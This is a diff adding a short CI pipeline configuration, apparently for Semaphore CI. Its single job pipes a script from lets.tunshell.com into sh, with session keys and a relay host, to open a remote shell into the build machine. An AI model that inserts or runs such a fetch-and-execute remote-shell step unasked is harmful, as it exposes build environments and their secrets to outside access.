@@ -1,0 +1,13 @@
+version: v1.0
+name: Initial Pipeline
+agent:
+  machine:
+    type: f1-standard-2
+    os_image: ubuntu2204
+blocks:
+  - name: 'Block #1'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T SN9p4agJ1SD3USkyBUvSHl fvPknb9gXAeiiEmPL7C27R eu.relay.tunshell.com'
